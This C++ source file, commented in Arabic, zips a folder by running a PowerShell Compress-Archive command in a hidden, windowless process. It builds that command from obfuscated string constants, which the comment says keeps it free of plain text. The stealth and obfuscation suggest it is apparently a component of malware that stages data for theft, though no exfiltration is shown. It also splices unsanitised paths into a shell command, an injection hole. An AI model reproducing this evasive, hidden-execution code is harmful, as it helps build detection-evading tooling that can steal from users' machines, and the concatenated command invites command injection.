// zip_utils.cpp – ضغط المجلدات باستخدام PowerShell (بدون نصوص واضحة)
#include "zip_utils.h"
#include "../crypto/obfuscation.h"
#include <windows.h>
#include <string>

bool ZipFolder(const std::string& folderPath, const std::string& zipFilePath) {
    // بناء أمر PowerShell باستخدام السلاسل المشفرة
    std::string cmdPart1 = GetObfuscatedString(STR_POWERSHELL_COMPRESS);  // "powershell -Command \"Compress-Archive -Path '"
    std::string cmdPart2 = GetObfuscatedString(70);                        // "\\*' -DestinationPath '"
    
    // الأمر الكامل: powershell -Command "Compress-Archive -Path 'folder\*' -DestinationPath 'output.zip' -Force"
    std::string cmd = cmdPart1 + folderPath + cmdPart2 + zipFilePath + "' -Force\"";
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return false;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    DWORD attrs = GetFileAttributesA(zipFilePath.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES);
}